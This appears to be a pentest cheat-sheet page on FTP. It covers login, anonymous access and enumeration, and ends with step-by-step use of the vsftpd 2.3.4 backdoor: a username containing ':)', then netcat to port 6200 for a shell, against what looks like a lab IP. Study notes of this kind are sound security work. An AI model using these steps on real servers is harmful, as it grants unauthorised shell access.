---
icon: file-chart-column
description: File Transfer Protocol
---

# FTP

{% tabs %}
{% tab title="Port" %}
```
21
```
{% endtab %}

{% tab title="Login " %}
{% code title="Standard Login" %}
```bash
ftp <IP>
```
{% endcode %}

* <mark style="color:purple;">Sometimes</mark> <mark style="color:orange;">**`anonymous`**</mark> <mark style="color:purple;">is enable by default, then just type it when being prompt by an user.</mark>
* <mark style="color:purple;">To login as any other user:</mark>

```bash
USER <user>
```

* To specify a password:

```bash
PASS <password>
```
{% endtab %}
{% endtabs %}

***

{% hint style="info" %}
## <mark style="color:purple;">Enumeration</mark>

* <mark style="color:purple;">Is always good practice to look for vulnerabilities:</mark>

```bash
searchsploit <version>
```

* <mark style="color:purple;">Check where you land:</mark>

```bash
pwd
```

* <mark style="color:purple;">List directories:</mark>

```bash
dir
```
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Vulnerabilities</mark>

### <mark style="color:orange;">`vsftpd 2.3.4`</mark>

* <mark style="color:purple;">Connect to</mark> <mark style="color:orange;">**`FTP`**</mark> <mark style="color:purple;">with any username that contains</mark> <mark style="color:orange;">**`:)`**</mark><mark style="color:purple;">, and</mark> <mark style="color:orange;">**`any password`**</mark><mark style="color:purple;">.</mark>
* <mark style="color:purple;">Then connect to</mark> <mark style="color:orange;">**`port 6200`**</mark> <mark style="color:purple;">to get a shell:</mark>

```bash
nc 10.10.10.131 21
```

* <mark style="color:purple;">Now connect to the backdoor:</mark>

```bash
nc 10.10.10.131 6200
```

***


{% endhint %}
